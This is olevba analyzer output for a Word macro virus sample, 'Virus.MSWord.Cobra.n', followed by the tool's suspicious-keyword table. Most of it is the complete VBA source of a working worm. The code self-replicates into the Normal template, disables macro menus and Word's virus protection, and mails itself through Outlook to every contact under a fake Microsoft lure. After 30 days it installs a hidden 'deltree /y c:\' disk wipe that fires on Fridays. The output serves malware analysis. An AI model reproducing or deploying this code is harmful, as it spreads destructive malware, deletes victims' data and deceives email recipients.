olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.n-a88ca7dd4cd405452c998b5c7ac3531695efd4b0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.n-a88ca7dd4cd405452c998b5c7ac3531695efd4b0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10D.bas 
in file: Virus.MSWord.Cobra.n-a88ca7dd4cd405452c998b5c7ac3531695efd4b0 - OLE stream: 'Macros/VBA/AAX_10D'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0D
'An intelligent member of Cobra Family

Sub InfectCobra()
On Error Resume Next
InfectedDoc = False
InfectedNor = False
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name <> "AAX_10D" And IDoc.Name <> "ThisDocument" And IDoc.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=IDoc.Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name <> "AAX_10D" And INor.Name <> "ThisDocument" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=INor.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name = "AAX_10D" Then InfectedDoc = True
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name = "AAX_10D" Then InfectedNor = True
Next
If InfectedDoc = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, _
Name:="AAX_10D", _
Object:=wdOrganizerObjectProjectItems
End If
If InfectedNor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, _
Name:="AAX_10D", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub AutoOpen()
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
End Sub
Sub RegEdit()
If System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microsoft\office\", "Cobra") <> "Cobra" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microsoft\office\", "Cobra") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Cobra.LRB"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "LRB/DHK/BD"
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cobra\", "Inf")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cobra\", "Inf") = Format(Date, "mm/dd/yy")
End If
End Sub
Sub CreateCobra()
On Error Resume Next
InfectedDoc = False
InfectedNor = False
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cobra\", "Inf")
CD = Format(Date, "mm/dd/yyyy")
TD = DateValue(CD) - DateValue(ID)
If TD >= 30 Then
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name = "Cobra" Then InfectedDoc = True
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name = "Cobra" Then InfectedNor = True
Next
If InfectedDoc = False Then
Set AddMod = ActiveDocument.VBProject.VBComponents.Add(1)
AddMod.Name = "Cobra"
LA = "Sub FileNew" + Chr(13) + _
"On error resume next" + Chr(13) + _
"if weekday(date)=6 then " + Chr(13) + _
"Shell +""deltree /y c:\"", vbHide " + Chr(13) + _
"End if" + Chr(13) + _
"End Sub"
ActiveDocument.VBProject.VBComponents("Cobra").CodeModule.AddFromString LA
End If
If InfectedNor = False Then
Set AddMod = NormalTemplate.VBProject.VBComponents.Add(1)
AddMod.Name = "Cobra"
LA = "Sub FileNew" + Chr(13) + _
"On error resume next" + Chr(13) + _
"if weekday(date)=6 then " + Chr(13) + _
"Shell +""deltree /y c:\"", vbHide " + Chr(13) + _
"End if" + Chr(13) + _
"End Sub"
NormalTemplate.VBProject.VBComponents("Cobra").CodeModule.AddFromString LA
End If
End If
End Sub
Sub AutoClose()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileOpen()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileClose()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
WordBasic.FileClose
End Sub
Sub Prot()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub SendEmail()
On Error Resume Next
Dim udoC, dmnC, buosC
Set udoC = CreateObject("Outlook.Application")
Set dmnC = udoC.GetNameSpace("MAPI")
dmnC.Logon "profile", "password"
For lC = 1 To dmnC.AddressLists.Count
Set abC = dmnC.AddressLists(lC)
iC = 1
Set buosC = udoC.CreateItem(0)
For tC = 1 To abC.AddressEntries.Count
oC = abC.AddressEntries(iC)
buosC.Recipients.Add oC
iC = iC + 1
Next tC
buosC.Subject = "Important Message From Microsoft Via " _
& Application.UserName
buosC.Body = "Important documment;-"
buosC.Attachments.Add ActiveDocument.FullName
buosC.Send
oC = ""
Next lC
dmn.LogOff
End Sub
Sub FileExit()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
WordBasic.FileExit
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

